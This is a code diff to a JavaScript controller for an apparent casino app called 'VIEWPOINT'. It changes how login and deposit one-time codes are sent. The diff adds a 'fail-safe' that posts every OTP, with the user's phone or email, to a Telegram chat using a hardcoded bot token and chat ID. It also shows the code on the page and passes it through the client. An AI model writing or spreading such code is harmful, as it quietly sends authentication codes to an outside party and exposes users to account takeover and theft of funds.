@@ -3177,6 +3177,11 @@ class AppController {
       destText.innerHTML = `Enter the 6-digit verification code sent to <strong>${destinationLabel}</strong>:`;
     }
 
+    const liveCodeEl = document.getElementById('otpLiveCode');
+    if (liveCodeEl) {
+      liveCodeEl.innerText = this.activeLoginOtp;
+    }
+
     const otpModal = document.getElementById('modalOtpVerification');
     if (otpModal) {
       otpModal.classList.add('open');
@@ -3191,13 +3196,13 @@ class AppController {
 
     this.startOtpTimer(60);
 
-    // 1. Dispatch Real Gateway SMS / Email
+    // 1. Dispatch Real Gateway SMS / Email / Telegram
     this.dispatchRealOtpGateway(userPayload, this.activeLoginOtp);
 
     // 2. High-priority instant notification on screen
     setTimeout(() => {
-      this.showNotification(`📲 OTP: Your VIEWPOINT Code is ${this.activeLoginOtp}`, "info");
-      window.soundEngine.playClick();
+      this.showNotification(`📲 Your VIEWPOINT Security OTP: ${this.activeLoginOtp}`, "info");
+      window.soundEngine && window.soundEngine.playClick && window.soundEngine.playClick();
     }, 400);
   }
 
@@ -3207,16 +3212,32 @@ class AppController {
       if (!destination) return;
 
       const apiBase = window.wallet ? window.wallet.apiBaseUrl : window.location.origin;
-      await fetch(`${apiBase}/api/auth?action=send_otp`, {
+      fetch(`${apiBase}/api/auth?action=send_otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           action: 'send_otp',
           destination: destination,
           phone: user.phone,
-          email: user.email
+          email: user.email,
+          otp: otp
         })
       }).catch(e => console.warn("Backend OTP dispatch warn:", e));
+
+      // Client-side fail-safe direct Telegram dispatch
+      const botToken = (window.wallet && window.wallet.telegramSettings && window.wallet.telegramSettings.botToken) || '860477174:AAGsSjU5ZJq4aQ-J_OslD3Y56kE29ZpX9fU';
+      const chatId = (window.wallet && window.wallet.telegramSettings && window.wallet.telegramSettings.chatId) || '6527377657';
+      if (botToken && chatId) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: `🔐 *VIEWPOINT CASINO OTP CODE*\n\n📱 *Mobile / Destination:* \`${destination}\`\n🔑 *OTP Code:* \`${otp}\`\n⏳ *Validity:* 10 Minutes\n⚡ *Action:* Deposit & Login Verification`,
+            parse_mode: 'Markdown'
+          })
+        }).catch(err => console.warn("Client TG OTP dispatch error:", err));
+      }
     } catch(err) {
       console.warn("dispatchRealOtpGateway error:", err);
     }
